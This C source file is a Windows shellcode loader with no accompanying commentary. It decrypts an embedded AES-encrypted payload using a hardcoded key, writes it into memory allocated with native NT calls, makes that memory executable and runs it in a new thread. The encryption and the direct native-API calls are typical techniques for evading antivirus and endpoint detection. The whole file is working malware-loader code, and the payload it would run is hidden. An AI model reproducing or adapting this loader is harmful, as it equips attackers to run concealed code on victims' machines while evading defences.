#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")

#pragma comment(lib, "ntdll")

#define NtCurrentProcess()	   ((HANDLE)-1)
#define DEFAULT_BUFLEN 4096

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);



void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


int main(int argc, char** argv) {

    char AESkey[] = { 0x64, 0xb5, 0x31, 0xfe, 0xb3, 0x6b, 0xb3, 0x8c, 0x88, 0x6a, 0x4c, 0x38, 0xc, 0xcb, 0x19, 0x4a };
    unsigned char AESshellcode[] = { 0x8, 0x21, 0x22, 0xeb, 0xfa, 0xdb, 0x42, 0x9, 0x8e, 0x24, 0xb6, 0x10, 0xfb, 0x93, 0x5b, 0xfe, 0xc3, 0x9d, 0x75, 0x68, 0xcc, 0x35, 0xd0, 0xef, 0xfd, 0x23, 0x70, 0xe3, 0x1, 0x3d, 0x8f, 0xd0, 0xe6, 0x5b, 0x97, 0x5e, 0x79, 0x78, 0x55, 0xf9, 0xaf, 0x71, 0x67, 0x78, 0x3c, 0xd9, 0x4a, 0xe7, 0x81, 0xc, 0xe5, 0x50, 0x46, 0x47, 0xa, 0x2e, 0x79, 0x5b, 0x6f, 0x43, 0x4d, 0x10, 0x2d, 0x35, 0x93, 0x94, 0xdd, 0x8f, 0x36, 0x2d, 0x3, 0xed, 0x9, 0x33, 0xed, 0xe3, 0xe1, 0x43, 0x17, 0xb6, 0xff, 0xe9, 0x69, 0x33, 0x1c, 0x81, 0x83, 0xb, 0xbf, 0x13, 0x1c, 0x25, 0xd5, 0x2f, 0xb8, 0x90, 0x6d, 0x1e, 0xd3, 0x11, 0xd, 0x29, 0xf7, 0x13, 0xde, 0x7e, 0x71, 0x53, 0x7, 0x44, 0xf3, 0xf6, 0xf6, 0xc3, 0x54, 0xb3, 0xaa, 0xe1, 0xd6, 0xbf, 0x1e, 0xa, 0x9c, 0x25, 0x72, 0x9e, 0x8b, 0x54, 0x62, 0x1c, 0xd9, 0x72, 0xab, 0xbd, 0x30, 0x47, 0x65, 0xd2, 0x0, 0x45, 0xb, 0xc4, 0x16, 0xbb, 0x80, 0xf, 0xd4, 0x0, 0x22, 0x40, 0xd3, 0x4d, 0xbb, 0x3f, 0x64, 0xe1, 0xa8, 0x2a, 0x60, 0x1e, 0xd1, 0x0, 0xd9, 0xb3, 0x46, 0xb6, 0x1c, 0xd0, 0xe2, 0xe1, 0x7d, 0x99, 0x9f, 0x8a, 0x70, 0xd5, 0x7d, 0x9c, 0x88, 0xd, 0x2d, 0xbb, 0x4c, 0x2a, 0x3f, 0xeb, 0xfd, 0xdd, 0xad, 0x8f, 0xba, 0xcc, 0x87, 0x3, 0xcf, 0x8f, 0x15, 0x54, 0xc5, 0xc1, 0xa2, 0xcb, 0x9b, 0x14, 0xae, 0xcb, 0x8, 0xf, 0x5a, 0xae, 0x6d, 0x63, 0xf3, 0x82, 0xe2, 0xec, 0x79, 0xe0, 0x1c, 0xb1, 0x85, 0xa9, 0x22, 0xb0, 0x66, 0xe9, 0x73, 0xbe, 0xdc, 0xac, 0xdc, 0x7d, 0x2e, 0xac, 0x5d, 0x29, 0x23, 0x44, 0x11, 0xee, 0xbf, 0xc9, 0x60, 0xa2, 0x1e, 0x7, 0x6d, 0x9e, 0x56, 0xf2, 0xb4, 0x2a, 0xb6, 0x83, 0x4, 0xca, 0x7e, 0xcb, 0x7e, 0x63, 0x8a, 0x70, 0xa1, 0xe5, 0x1f, 0x6f, 0xa, 0x21, 0x2e, 0x5b, 0x4c, 0x6a, 0x62, 0x84, 0x70, 0x33, 0x84, 0xca, 0x48, 0x39, 0x6b, 0x64, 0xc6, 0x4, 0xc6, 0x6f, 0xe2, 0x6d, 0x29, 0xda, 0x78, 0x64, 0x59, 0x13, 0xfe, 0x2, 0x3, 0xd9, 0xe, 0x7e, 0x97, 0x10, 0x7c, 0xbd, 0x9a, 0xf1, 0xbf, 0xce, 0x4e, 0x4, 0xf1, 0x93, 0x25, 0x88, 0x52, 0x99, 0x44, 0xbd, 0x52, 0x7c, 0xfe, 0x2c, 0xdb, 0x50, 0x9, 0x3b, 0x2a, 0xd, 0x30, 0x73, 0x3c, 0x8c, 0xee, 0xec, 0xb8, 0xc8, 0xe3, 0x3d, 0x48, 0xed, 0xc0, 0x4b, 0xd1, 0x8d, 0x48, 0x0, 0x3, 0xd8, 0xc, 0xde, 0x69, 0xf9, 0xe, 0xda, 0x31, 0xfe, 0xb6, 0x77, 0xc4, 0x4d, 0x31, 0x25, 0xc5, 0xd1, 0xa1, 0x11, 0x22, 0x15, 0x8, 0xc7, 0xa5, 0x73, 0x19, 0x3a, 0x87, 0x5, 0xcc, 0x37, 0x34, 0xad, 0x8a, 0xfa, 0xae, 0x6b, 0xf8, 0x38, 0x4a, 0x5, 0x2e, 0x74, 0xda, 0x77, 0x2a, 0xa0, 0x4f, 0xab, 0xcd, 0xbb, 0x2e, 0x2f, 0xb8, 0xf7, 0xa1, 0x91, 0x8e, 0x42, 0x43, 0x85, 0xa, 0x6b, 0xfd, 0x6d, 0x37, 0xd8, 0xa, 0x53, 0x9f, 0x54, 0x49, 0x26, 0x2a, 0x6d, 0x9e, 0x85, 0x30, 0xe5, 0xc7, 0x91, 0x80, 0x75, 0x79, 0xc1, 0x2a, 0x87, 0xc9, 0xd0, 0x47, 0xdd, 0xc3, 0x9f, 0x66, 0xf0, 0x23, 0xf1, 0xa2, 0x4, 0x7e, 0xf1, 0xd7, 0x28, 0x1d, 0x3b, 0xcd, 0x2, 0x7, 0xc, 0x72, 0x37, 0x94, 0xa6, 0x1b, 0x5c, 0x6d, 0x41 };

    DWORD payload_length = sizeof(AESshellcode);
    
    PVOID BaseAddress = NULL;
    SIZE_T dwSize = 0x2000;

    NTSTATUS status1 = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        return 1;
    }

    // Decrypt the AES payload to Original Shellcode
     DecryptAES((char*)AESshellcode, payload_length, AESkey, sizeof(AESkey));


    RtlMoveMemory(BaseAddress, AESshellcode, sizeof(AESshellcode));

    HANDLE hThread;
    DWORD OldProtect = 0;

    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        return 2;
    }

 
    HANDLE hHostThread = INVALID_HANDLE_VALUE;

    NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
        return 3;
    }

    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;


    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
        return 4;
    }

    return 0;
}

